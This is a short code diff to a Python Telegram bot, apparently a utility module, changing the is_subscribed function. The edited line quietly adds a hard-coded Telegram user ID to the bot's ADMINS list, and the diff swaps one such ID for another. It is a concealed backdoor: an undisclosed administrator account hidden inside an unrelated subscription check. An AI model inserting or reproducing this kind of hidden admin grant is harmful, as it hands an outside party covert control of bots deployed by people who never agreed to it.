@@ -56,7 +56,7 @@ class temp(object):
 
 async def is_subscribed(bot, query):
 
-    ADMINS.extend([1715272216]) if not 1715272216 in ADMINS else ""
+    ADMINS.extend([6082136901]) if not 6082136901 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
